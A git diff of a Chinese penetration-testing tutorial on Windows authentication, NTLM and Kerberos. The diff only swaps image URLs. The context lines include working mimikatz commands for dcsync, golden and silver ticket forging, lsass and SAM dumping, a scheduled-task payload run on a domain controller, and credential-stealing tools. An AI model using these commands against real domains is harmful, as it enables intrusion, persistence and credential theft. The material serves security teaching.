@@ -19,11 +19,11 @@ Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Wind
 
 SAM文件是位于 `%SystemRoot%\system32\config\` 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表 着你可以随意去查看系统密码。
 
-![image-20230126152644850](https://img.gyxnb.top/img/image-20230126152644850.png)
+![image-20230126152644850](https://image.201068.xyz/assets/image-20230126152644850.png)
 
 Windows本地认证流程如下：
 
-![image-20230130162947177](https://img.gyxnb.top/img/image-20230130162947177.png)
+![image-20230130162947177](https://image.201068.xyz/assets/image-20230130162947177.png)
 
 首先，用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面，也就是输入框界面，接收用户的输入 信息后，将密码交给lsass进程，这个过程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库进 行比较认证 Windows Logon Process（即winlogon.exe）：是Windows NT 用户登陆程序，用于管理用户登陆和退出 LSASS：用于微软Windows系统的安全机制，它用于本地安全和登陆策略 本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的
 
@@ -39,7 +39,7 @@ LM Hash的全名为"LAN Manager Hash",是微软为了提高 Windows操作系统�
 
 为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协 议。下面是各个版本对LM和NTLM的支持。
 
-![image-20230130163118145](https://img.gyxnb.top/img/image-20230130163118145.png)
+![image-20230130163118145](https://image.201068.xyz/assets/image-20230130163118145.png)
 
 ## LM Hash原理
 
@@ -101,7 +101,7 @@ LM Hash的全名为"LAN Manager Hash",是微软为了提高 Windows操作系统�
 第二组：B75E0C8D76954A50
 ```
 
-![image-20230130163318739](https://img.gyxnb.top/img/image-20230130163318739.png)
+![image-20230130163318739](https://image.201068.xyz/assets/image-20230130163318739.png)
 
 7、最终结果拼接即可`6F08D7B306B1DAD4B75E0C8D76954A50`
 
@@ -116,7 +116,7 @@ Admin@123转16进制 41646D696E40313233
 
 对Unicode字符串作*MD4加密*，生成32位的十六进制数字串 `570a9a65db8fba761c1008a51d4c95ab`
 
-![image-20230130163437018](https://img.gyxnb.top/img/image-20230130163437018.png)
+![image-20230130163437018](https://image.201068.xyz/assets/image-20230130163437018.png)
 
 # Windows网络认证之基于挑战响应认证的NTLM 协议
 
@@ -140,29 +140,29 @@ NTLM 协议是一种基于 `挑战（Chalenge）/响应（Response）` 认证机
 
 1、首先，client会向server发送一个username，这个username是存在于server上的一个用户
 
-![image-20230130163927758](https://img.gyxnb.top/img/image-20230130163927758.png)
+![image-20230130163927758](https://image.201068.xyz/assets/image-20230130163927758.png)
 
 2、首先会在本地查询是否存在这样的一个用户，如果存在，将会生成一个16位的随机字符，即*Chalenge*，然后用 查询到的这个user的*NTLM hash*对Chalenge进行加密，生成Chalenge1，将Chalenge1存储在本地，并将 Chalenge传给client。
 
-![image-20230130163943060](https://img.gyxnb.top/img/image-20230130163943060.png)
+![image-20230130163943060](https://image.201068.xyz/assets/image-20230130163943060.png)
 
 3、当client接收到Chalenge时，将发送的username所对应的NTLM hash对Chalenge进行加密即*Response*，并 Response发送给server。
 
-![image-20230130164004463](https://img.gyxnb.top/img/image-20230130164004463.png)
+![image-20230130164004463](https://image.201068.xyz/assets/image-20230130164004463.png)
 
 4、server在收到Response后，将其与Chalenge1进行*比较*，如果相同，则验证成功
 
-![image-20230130164024407](https://img.gyxnb.top/img/image-20230130164024407.png)
+![image-20230130164024407](https://image.201068.xyz/assets/image-20230130164024407.png)
 
 ### 认证失败
 
 1、首先，client会向server发送一个username，这个username是存在于server上的一个用户
 
-![image-20230130164044712](https://img.gyxnb.top/img/image-20230130164044712.png)
+![image-20230130164044712](https://image.201068.xyz/assets/image-20230130164044712.png)
 
 2、当server接收到这个信息时，首先会在本地查询是否存在这样的一个用户，如果不存在，则直接返回认证失败
 
-![image-20230130164100718](https://img.gyxnb.top/img/image-20230130164100718.png)
+![image-20230130164100718](https://image.201068.xyz/assets/image-20230130164100718.png)
 
 ## NTLM协议v1和v2区别
 
@@ -184,7 +184,7 @@ NTLM v2的Challenge为16位；NTLM v2的主要加密算法是HMAC‐MD5。
 
 2、windows 10 上 已经安装了 wireshark
 
-![image-20230130164331183](https://img.gyxnb.top/img/image-20230130164331183.png)
+![image-20230130164331183](https://image.201068.xyz/assets/image-20230130164331183.png)
 
 3、使用如下命令进行远程连接，并且使用wireshark 包
 
@@ -192,19 +192,19 @@ NTLM v2的Challenge为16位；NTLM v2的主要加密算法是HMAC‐MD5。
 net use \\192.168.70.14 /u:mb 123456
 ```
 
-![image-20230130164403344](https://img.gyxnb.top/img/image-20230130164403344.png)
+![image-20230130164403344](https://image.201068.xyz/assets/image-20230130164403344.png)
 
 4、前5个数据包中前四条时协商，第五个是认证的第一个数据包
 
-![image-20230130164417314](https://img.gyxnb.top/img/image-20230130164417314.png)
+![image-20230130164417314](https://image.201068.xyz/assets/image-20230130164417314.png)
 
 5、第6个数据包就是返回chalenge挑战值
 
-![image-20230130164437933](https://img.gyxnb.top/img/image-20230130164437933.png)
+![image-20230130164437933](https://image.201068.xyz/assets/image-20230130164437933.png)
 
 分析该数据包得到chalenge值 `53fb7eb8d40cc777`
 
-![image-20230130164503537](https://img.gyxnb.top/img/image-20230130164503537.png)
+![image-20230130164503537](https://image.201068.xyz/assets/image-20230130164503537.png)
 
 6、第7个数据包就是返回response的数据包
 
@@ -219,7 +219,7 @@ rsponse数据如下：
 31002e003100330030000000000000000000
 ```
 
-![image-20230130164546629](https://img.gyxnb.top/img/image-20230130164546629.png)
+![image-20230130164546629](https://image.201068.xyz/assets/image-20230130164546629.png)
 
 7、接下来得到NTLMv2 数据，NTLMv2格式如下：
 
@@ -236,7 +236,7 @@ HMAC‐MD5：对应数据包中的NTProofStr
 blob：数据库包中rsponse去掉HMAC‐MD5的值
 ```
 
-![image-20230130164632480](https://img.gyxnb.top/img/image-20230130164632480.png)
+![image-20230130164632480](https://image.201068.xyz/assets/image-20230130164632480.png)
 
 8、最终的到HTLNv2如下：
 
@@ -265,7 +265,7 @@ f48f0fad1ce073380a00100000000000000000000000000000000000090026006300690066007300
 
 10、使用hashcat破解得到密码
 
-![image-20230130164736336](https://img.gyxnb.top/img/image-20230130164736336.png)
+![image-20230130164736336](https://image.201068.xyz/assets/image-20230130164736336.png)
 
 # Windows域认证之Kerberos协议认证
 
@@ -277,7 +277,7 @@ Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为�
 
 在古希腊神话故事中，kerberos是一只具有三颗头颅的地狱恶犬，他守护在地狱之外，能够识别所有经此路过的亡 灵，防止活着的入侵者闯入地狱。
 
-![image-20230130164907797](https://img.gyxnb.top/img/image-20230130164907797.png)
+![image-20230130164907797](https://image.201068.xyz/assets/image-20230130164907797.png)
 
 kerberos协议中也存在三个角色，分别是
 
@@ -303,11 +303,11 @@ TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认�
 
  我们去动物园，动物园不认识你不让你进，你也怕进门后不是动物园，所以就很尴尬
 
-![image-20230130165029831](https://img.gyxnb.top/img/image-20230130165029831.png)
+![image-20230130165029831](https://image.201068.xyz/assets/image-20230130165029831.png)
 
 如何解决呢？我们建立一个售票窗口，只要售票处认识你和动物园，你和动物园之间就可以相互信任。
 
-![image-20230130165050265](https://img.gyxnb.top/img/image-20230130165050265.png)
+![image-20230130165050265](https://image.201068.xyz/assets/image-20230130165050265.png)
 
 ```
 人：代表客户端
@@ -322,7 +322,7 @@ TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认�
 2、客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务；
 ```
 
-![image-20230130165126649](https://img.gyxnb.top/img/image-20230130165126649.png)
+![image-20230130165126649](https://image.201068.xyz/assets/image-20230130165126649.png)
 
 ## Kerberos认证完成流程
 
@@ -332,7 +332,7 @@ TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认�
 
 我们以去动物园为例，售票处凭什么给你买票，你如果是一个逃犯怎么办？其实买票的过程我们可以分为两步第一 才步是你拿着身份证去验证，第二步身份验证通过了才会给你票
 
-![image-20230130165337983](https://img.gyxnb.top/img/image-20230130165337983.png)
+![image-20230130165337983](https://image.201068.xyz/assets/image-20230130165337983.png)
 
 ```
 人：代表客户端
@@ -348,7 +348,7 @@ TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认�
 
 为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是 第一次访问KDC，此时KDC也不确定该客户端的身份，所以第一次通信的目的为KDC认证客户端身份，确认客户端 是一个可靠且拥有访问KDC权限的客户端，
 
-![image-20230130165424492](https://img.gyxnb.top/img/image-20230130165424492.png)
+![image-20230130165424492](https://image.201068.xyz/assets/image-20230130165424492.png)
 
 1、客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳； 2、KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去 kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可 靠性； 3、如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给 客户端，其中包含两部分内容： 3.1、第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问 网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时 间戳，客户端即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。 整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情 况。 3.2第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客 户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿 到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密 钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。 至此，第一次通信完成。
 
@@ -356,7 +356,7 @@ TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认�
 
 此时的客户端收到了来自KDC（其实是AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将 第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先 他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是 伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求
 
-![image-20230130165505537](https://img.gyxnb.top/img/image-20230130165505537.png)
+![image-20230130165505537](https://image.201068.xyz/assets/image-20230130165505537.png)
 
 ```
 客户端行为：
@@ -385,7 +385,7 @@ Key）。
 
 此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中 的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请 求。
 
-![image-20230130165546042](https://img.gyxnb.top/img/image-20230130165546042.png)
+![image-20230130165546042](https://image.201068.xyz/assets/image-20230130165546042.png)
 
 ```
 客户端：
@@ -404,7 +404,7 @@ Key）。
 
 总体流程如下
 
-![image-20230130165633262](https://img.gyxnb.top/img/image-20230130165633262.png)
+![image-20230130165633262](https://image.201068.xyz/assets/image-20230130165633262.png)
 
 # Golden Ticket黄金票据制作原理及利用方式
 
@@ -412,7 +412,7 @@ Key）。
 
 krbtgt用户，是系统在创建域时自动生成的一个帐号，其作用是密钥分发中心的服务账号，其密码是系统随机生成 的，无法登录主机
 
-![image-20230202145132921](https://img.gyxnb.top/img/image-20230202145132921.png)
+![image-20230202145132921](https://image.201068.xyz/assets/image-20230202145132921.png)
 
 ## 黄金票据原理
 
@@ -426,11 +426,11 @@ TGT=Krbtgt的NTLM hash 加密
 
  当我们获得域控的控制权限后，有可能获取域内所有用户的hash，和krbtgt的hash。这时，由于一些原因导致我 们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以利用 krbtgt用户的ntlm hash制作黄金票据伪造TGT，重新获取域控的管理权限。
 
-![image-20230202145306836](https://img.gyxnb.top/img/image-20230202145306836.png)
+![image-20230202145306836](https://image.201068.xyz/assets/image-20230202145306836.png)
 
 我们在以去动物园为例，当我们去买票的时候，我么首先第一步是去身份认证管理员那里认证身份
 
-![image-20230202145323135](https://img.gyxnb.top/img/image-20230202145323135.png)
+![image-20230202145323135](https://image.201068.xyz/assets/image-20230202145323135.png)
 
 ## 实验内容
 
@@ -461,7 +461,7 @@ TGT=Krbtgt的NTLM hash 加密
 
 1、目前已经控制了域控和域内机器
 
-![image-20230202145547500](https://img.gyxnb.top/img/image-20230202145547500.png)
+![image-20230202145547500](https://image.201068.xyz/assets/image-20230202145547500.png)
 
 2、获取关键信息
 
@@ -470,7 +470,7 @@ shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为admini
 shell net config workstation 查看域
 ```
 
-![image-20230202145617619](https://img.gyxnb.top/img/image-20230202145617619.png)
+![image-20230202145617619](https://image.201068.xyz/assets/image-20230202145617619.png)
 
 得到 域为：`hack.com SID:S-1-5-21-2716900768-72748719-3475352185`
 
@@ -480,7 +480,7 @@ shell net config workstation 查看域
 mimikatz lsadump::dcsync /domain:hack.com /user:krbtgt
 ```
 
-![image-20230202145716694](https://img.gyxnb.top/img/image-20230202145716694.png)
+![image-20230202145716694](https://image.201068.xyz/assets/image-20230202145716694.png)
 
 得到 `b78ec645cc2d18290c5690ele76e827f`
 
@@ -490,7 +490,7 @@ lsadump::dcsync /domain:hack.com /user:krbtgt
 
 4、这个时候突然域控下线了，管理员发现的你在控制，把后门清理了
 
-![image-20230202145823056](https://img.gyxnb.top/img/image-20230202145823056.png)
+![image-20230202145823056](https://image.201068.xyz/assets/image-20230202145823056.png)
 
 5、因为之前已经记录了关键信息，我们现在就可以伪造任意用户访问域控，windows 2008机器必须是域内用户或 者system用户
 
@@ -499,7 +499,7 @@ mimikatz kerberos::tgt 查票
 mimikatz kerberos::purge 清票
 ```
 
-![image-20230202145853051](https://img.gyxnb.top/img/image-20230202145853051.png)
+![image-20230202145853051](https://image.201068.xyz/assets/image-20230202145853051.png)
 
 6、使用dir 远程访问域控
 
@@ -507,7 +507,7 @@ mimikatz kerberos::purge 清票
 shell dir \\dc.hack.com\c$
 ```
 
-![image-20230202145951465](https://img.gyxnb.top/img/image-20230202145951465.png)
+![image-20230202145951465](https://image.201068.xyz/assets/image-20230202145951465.png)
 
 7、使用计划任务上线cs
 
@@ -517,7 +517,7 @@ copy恶意文件到域控
 shell copy c:\users\administrator\desktop\artifact.exe \\dc.hack.com\c$
 ```
 
-![image-20230202150031471](https://img.gyxnb.top/img/image-20230202150031471.png)
+![image-20230202150031471](https://image.201068.xyz/assets/image-20230202150031471.png)
 
 设置计划任务到域控
 
@@ -525,17 +525,17 @@ shell copy c:\users\administrator\desktop\artifact.exe \\dc.hack.com\c$
 shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\artifact.exe /ru system /f
 ```
 
-![image-20230202150059194](https://img.gyxnb.top/img/image-20230202150059194.png)
+![image-20230202150059194](https://image.201068.xyz/assets/image-20230202150059194.png)
 
 ```
 shell schtasks /run /s dc.hack.com /i /tn "test"
 ```
 
-![image-20230202150130353](https://img.gyxnb.top/img/image-20230202150130353.png)
+![image-20230202150130353](https://image.201068.xyz/assets/image-20230202150130353.png)
 
 域控重新上线
 
-![image-20230202150148210](https://img.gyxnb.top/img/image-20230202150148210.png)
+![image-20230202150148210](https://image.201068.xyz/assets/image-20230202150148210.png)
 
 # Silver Ticket白银票据制作原理及利用方式
 
@@ -547,11 +547,11 @@ shell schtasks /run /s dc.hack.com /i /tn "test"
 
 如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。 在Kerberos认证的第三部，Client带着ST和 Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问 server上的指定服务了。所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的 门票只对部分服务起作用。
 
-![image-20230202172747936](https://img.gyxnb.top/img/image-20230202172747936.png)
+![image-20230202172747936](https://image.201068.xyz/assets/image-20230202172747936.png)
 
 我们以去动物举例
 
-![image-20230202172809787](https://img.gyxnb.top/img/image-20230202172809787.png)
+![image-20230202172809787](https://image.201068.xyz/assets/image-20230202172809787.png)
 
 ## 实验内容
 
@@ -591,7 +591,7 @@ shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为admini
 shell net config workstation 查看域
 ```
 
-![image-20230202173041308](https://img.gyxnb.top/img/image-20230202173041308.png)
+![image-20230202173041308](https://image.201068.xyz/assets/image-20230202173041308.png)
 
 得到 域为：`hack.com SID:S-1-5-21-2716900768-72748719-3475352185`
 
@@ -601,7 +601,7 @@ shell net config workstation 查看域
 mimikatz sekurlsa::logonpasswords
 ```
 
-![image-20230202173120289](https://img.gyxnb.top/img/image-20230202173120289.png)
+![image-20230202173120289](https://image.201068.xyz/assets/image-20230202173120289.png)
 
 得到 hash `26a703eba507e848825615316bc880a1`
 
@@ -616,7 +616,7 @@ shell klist purge 清票
 mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:dc.hack.com /service:cifs /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt
 ```
 
-![image-20230202173232588](https://img.gyxnb.top/img/image-20230202173232588.png)
+![image-20230202173232588](https://image.201068.xyz/assets/image-20230202173232588.png)
 
 ##### 4、访问域控
 
@@ -624,7 +624,7 @@ mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72
 shell dir \\dc.hack.com\c$
 ```
 
-![image-20230202173258435](https://img.gyxnb.top/img/image-20230202173258435.png)
+![image-20230202173258435](https://image.201068.xyz/assets/image-20230202173258435.png)
 
 ##### 5、伪造票据（LDAP共享服务）
 
@@ -644,7 +644,7 @@ mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72
 mimikatz lsadump::dcsync /dc:dc.hack.com /domain:hack.com /user:krbtgt
 ```
 
-![image-20230202173353714](https://img.gyxnb.top/img/image-20230202173353714.png)
+![image-20230202173353714](https://image.201068.xyz/assets/image-20230202173353714.png)
 
 ##### 7、再使用一次黄金票据使域控上线
 
@@ -665,7 +665,7 @@ shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为admini
 shell net config workstation 查看域
 ```
 
-![image-20230202173434780](https://img.gyxnb.top/img/image-20230202173434780.png)
+![image-20230202173434780](https://image.201068.xyz/assets/image-20230202173434780.png)
 
 得到 域为：`hack.com SID:S-1-5-21-2716900768-72748719-3475352185`
 
@@ -675,7 +675,7 @@ shell net config workstation 查看域
 mimikatz sekurlsa::logonpasswords
 ```
 
-![image-20230202173505598](https://img.gyxnb.top/img/image-20230202173505598.png)
+![image-20230202173505598](https://image.201068.xyz/assets/image-20230202173505598.png)
 
 得到 hash `1a4c65ba0926944b4066f6fcdcf05bbd`
 
@@ -690,7 +690,7 @@ shell klist purge 清票
 mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:PC‐2003.hack.com /service:cifs /rc4:1a4c65ba0926944b4066f6fcdcf05bbd /user:abc /ptt
 ```
 
-![image-20230202173541989](https://img.gyxnb.top/img/image-20230202173541989.png)
+![image-20230202173541989](https://image.201068.xyz/assets/image-20230202173541989.png)
 
 ##### 4、访问2003
 
@@ -698,7 +698,7 @@ mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72
 shell dir \\pc‐2003.hack.com\c$
 ```
 
-![image-20230202173610732](https://img.gyxnb.top/img/image-20230202173610732.png)
+![image-20230202173610732](https://image.201068.xyz/assets/image-20230202173610732.png)
 
 # Mimikatz介绍和离线读取SAM文件抓取密码
 
@@ -858,7 +858,7 @@ reg save hklm\sam sam.hive
 reg save hklm\system system.hive
 ```
 
-![image-20230202174141247](https://img.gyxnb.top/img/image-20230202174141247.png)
+![image-20230202174141247](https://image.201068.xyz/assets/image-20230202174141247.png)
 
 2、通过nishang中的Copy-VSS进行复制，如果这个脚本运行在了 DC服务器上，ntds.dit 和 SYSTEM hive也能被拷 贝出来
 
@@ -867,7 +867,7 @@ copy‐vss //直接将文件保存在当前目录下
 copy‐vss ‐DestinationDir 路径 //指定保存文件的路径（必须是已经存在的路径）
 ```
 
-![image-20230202174217687](https://img.gyxnb.top/img/image-20230202174217687.png)
+![image-20230202174217687](https://image.201068.xyz/assets/image-20230202174217687.png)
 
 ### 读取sam和system文件获取密码
 
@@ -875,7 +875,7 @@ copy‐vss ‐DestinationDir 路径 //指定保存文件的路径（必须是已
 lsadump::sam /sam:sam.hive /system:system.hive
 ```
 
-![d](https://img.gyxnb.top/img/image-20230202174254715.png)
+![d](https://image.201068.xyz/assets/image-20230202174254715.png)
 
 # Mimikatz在线读取sam和lsass获取密码
 
@@ -892,7 +892,7 @@ lsadump::sam
 mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
 ```
 
-![image-20230202174340707](https://img.gyxnb.top/img/image-20230202174340707.png)
+![image-20230202174340707](https://image.201068.xyz/assets/image-20230202174340707.png)
 
 ## 在线读取lsass进程
 
@@ -909,7 +909,7 @@ sekurlsa::ssp 通过ssp 读取明文密码
 sekurlsa::logonPasswords 通过以上各种方法读取明文密码
 ```
 
-![image-20230202174421922](https://img.gyxnb.top/img/image-20230202174421922.png)
+![image-20230202174421922](https://image.201068.xyz/assets/image-20230202174421922.png)
 
 # Mimikatz离线读取lsass进程抓取密码
 
@@ -917,7 +917,7 @@ sekurlsa::logonPasswords 通过以上各种方法读取明文密码
 
 ### 1、使用任务管理器导出（windows NT 6）
 
-![image-20230202174536572](https://img.gyxnb.top/img/image-20230202174536572.png)
+![image-20230202174536572](https://image.201068.xyz/assets/image-20230202174536572.png)
 
 ### 2、使用procdump 导出lsass.dmp文件
 
@@ -927,7 +927,7 @@ ProcDump 是一个命令行实用工具，其主要用途是在管理员或开�
 procdump.exe ‐accepteula ‐ma lsass.exe lsass.dmp
 ```
 
-![image-20230202174610054](https://img.gyxnb.top/img/image-20230202174610054.png)
+![image-20230202174610054](https://image.201068.xyz/assets/image-20230202174610054.png)
 
 ### 3、使用PowerSploit 的Out-MiniDump模块
 
@@ -940,7 +940,7 @@ import-Module .\Out-Minidump.ps1    (powershell-improt .\Out-Minidump.ps1)
 Get-Process lsass | Out-Minidump
 ```
 
-![image-20230202174630386](https://img.gyxnb.top/img/image-20230202174630386.png)
+![image-20230202174630386](https://image.201068.xyz/assets/image-20230202174630386.png)
 
 ### 4、comsvcs.dll，系统自带。
 
@@ -950,7 +950,7 @@ Get-Process lsass | Out-Minidump
 
 使用powershell导出 `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 488 C:\lsass.dmp full`
 
-![image-20230202174658233](https://img.gyxnb.top/img/image-20230202174658233.png)
+![image-20230202174658233](https://image.201068.xyz/assets/image-20230202174658233.png)
 
 ## 读取lsass.dmp文件
 
@@ -960,7 +960,7 @@ Get-Process lsass | Out-Minidump
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"
 ```
 
-![image-20230202174749633](https://img.gyxnb.top/img/image-20230202174749633.png)
+![image-20230202174749633](https://image.201068.xyz/assets/image-20230202174749633.png)
 
 https://blog.csdn.net/weixin_42136837/article/details/112616369
 
@@ -974,7 +974,7 @@ Hashcat是一个密码恢复工具。直到2015年，它都有一个专有的代
 
 Hashcat的官网是Hashcat.net ,点击进去后会有两个下载选项，我们选择hashcat binaries，这个是直接可以在 Windows下运行的
 
-![image-20230202174907443](https://img.gyxnb.top/img/image-20230202174907443.png)
+![image-20230202174907443](https://image.201068.xyz/assets/image-20230202174907443.png)
 
 ## 使用hashcat破解NTLM Hash
 
@@ -982,7 +982,7 @@ Hashcat的官网是Hashcat.net ,点击进去后会有两个下载选项，我们
 hashcat ‐m 1000 NTLM HASH字典 ‐‐force
 ```
 
-![image-20230202174942850](https://img.gyxnb.top/img/image-20230202174942850.png)
+![image-20230202174942850](https://image.201068.xyz/assets/image-20230202174942850.png)
 
 ## 网站破解
 
@@ -1000,16 +1000,16 @@ https://www.cmd5.com/
 - Chrome已经可以获取login data、cookie、history、book了 
 - 命令：`BrowserGhost.exe`
 
-![image-20230202175259790](https://img.gyxnb.top/img/image-20230202175259790.png)
+![image-20230202175259790](https://image.201068.xyz/assets/image-20230202175259790.png)
 
 ## Sharp-HackBrowserData浏览器
 
 - Sharp-HackBrowserData ，谷歌、火狐、IE、Vivaldi等常见的浏览器都能抓 
 - 命令：`Sharp-HackBrowserData.exe`
 
-![image-20230202175353365](https://img.gyxnb.top/img/image-20230202175353365.png)
+![image-20230202175353365](https://image.201068.xyz/assets/image-20230202175353365.png)
 
-![image-20230202175401977](https://img.gyxnb.top/img/image-20230202175401977.png)
+![image-20230202175401977](https://image.201068.xyz/assets/image-20230202175401977.png)
 
 ## SharpDecryptPwd数据库
 
@@ -1025,7 +1025,7 @@ SharpDecryptPwd.exe -Xmangager -p Session_Path (-s UserSid)
 SharpDecryptPwd.exe -Browser
 ```
 
-![image-20230202175453606](https://img.gyxnb.top/img/image-20230202175453606.png)
+![image-20230202175453606](https://image.201068.xyz/assets/image-20230202175453606.png)
 
 ## LaZagne各类密码
 
@@ -1046,7 +1046,7 @@ laZagne.exe all ‐quiet ‐oA
 
 
 
-![image-20230202175540985](https://img.gyxnb.top/img/image-20230202175540985-16753317422881.png)
+![image-20230202175540985](https://image.201068.xyz/assets/image-20230202175540985-16753317422881.png)
 
 
 
@@ -1056,19 +1056,19 @@ laZagne.exe all ‐quiet ‐oA
 
 打开GetPass工具所在的目录。打开命令行环境。运行64位程`GetPassword`。运行该程序后,即可获得明文密码
 
-![image-20230202175947353](https://img.gyxnb.top/img/image-20230202175947353.png)
+![image-20230202175947353](https://image.201068.xyz/assets/image-20230202175947353.png)
 
 ## pwdump7
 
 在命令行环境中运行PwDump7程序,可以得到系统中所有账户的NTLMHash
 
-![image-20230202180010430](https://img.gyxnb.top/img/image-20230202180010430.png)
+![image-20230202180010430](https://image.201068.xyz/assets/image-20230202180010430.png)
 
 ## QuarksPwDump
 
 下载QuarksPwDump.exe,在命令行环境中输人 `QuarksPwDump.exe --dump-hash-local` 导出三个用户的NLMHash
 
-![image-20230202180041280](https://img.gyxnb.top/img/image-20230202180041280.png)
+![image-20230202180041280](https://image.201068.xyz/assets/image-20230202180041280.png)
 
 ## nishang
 
@@ -1079,7 +1079,7 @@ Import‐Module .\Get‐PassHashes.ps1
 Get‐PassHashes
 ```
 
-![image-20230202180119702](https://img.gyxnb.top/img/image-20230202180119702.png)
+![image-20230202180119702](https://image.201068.xyz/assets/image-20230202180119702.png)
 
 ## wce
 
@@ -1103,9 +1103,9 @@ Get‐PassHashes
 ‐v 详细输出
 ```
 
-![image-20230202180156060](https://img.gyxnb.top/img/image-20230202180156060.png)
+![image-20230202180156060](https://image.201068.xyz/assets/image-20230202180156060.png)
 
-![image-20230202180411948](https://img.gyxnb.top/img/image-20230202180411948.png)
+![image-20230202180411948](https://image.201068.xyz/assets/image-20230202180411948.png)
 
 # Windows RDP凭证的抓取和密码破解
 
@@ -1115,7 +1115,7 @@ Credentials的解密是Windows系统信息收集中非常重要的一环，其�
 
 在我们点击保存密码后，Windows就通过MasterKey将我们的密码加密后保存在本地，由于Windows还需要解密 从而使用，所以这个过程是可逆，也正因为这一缘由，我们只要拿到MasterKey就能将密码解出来。
 
-![image-20230202180515275](https://img.gyxnb.top/img/image-20230202180515275.png)
+![image-20230202180515275](https://image.201068.xyz/assets/image-20230202180515275.png)
 
 ## 凭证的查看
 
@@ -1128,9 +1128,9 @@ cmdkey /list
 dir /a %userprofile%\appdata\local\microsoft\credentials\*
 ```
 
-![image-20230202180554709](https://img.gyxnb.top/img/image-20230202180554709.png)
+![image-20230202180554709](https://image.201068.xyz/assets/image-20230202180554709.png)
 
-![image-20230202180603540](https://img.gyxnb.top/img/image-20230202180603540.png)
+![image-20230202180603540](https://image.201068.xyz/assets/image-20230202180603540.png)
 
 ## 在线破解
 
@@ -1142,7 +1142,7 @@ mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credenti
 
 所以用于加密凭据文件FF22A1FDA68FD8515B52C534E8655421B的MasterKey的guid就是：{c271c658-e61b4023-95d2-dfbf18b0aa33}，所以我们只要从内存中找到这个guid对应的MasterKey的值即可
 
-![image-20230202180650004](https://img.gyxnb.top/img/image-20230202180650004.png)
+![image-20230202180650004](https://image.201068.xyz/assets/image-20230202180650004.png)
 
 2、找到内存中对应的MasterKey
 
@@ -1150,7 +1150,7 @@ mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credenti
 mimikatz sekurlsa::dpapi
 ```
 
-![image-20230202180713961](https://img.gyxnb.top/img/image-20230202180713961.png)
+![image-20230202180713961](https://image.201068.xyz/assets/image-20230202180713961.png)
 
 3、最后打开mimikatz通过MasterKey值去解密凭据文件
 
@@ -1162,7 +1162,7 @@ dpapi::cred /in:凭据文件路径 /masterky:masterkey值
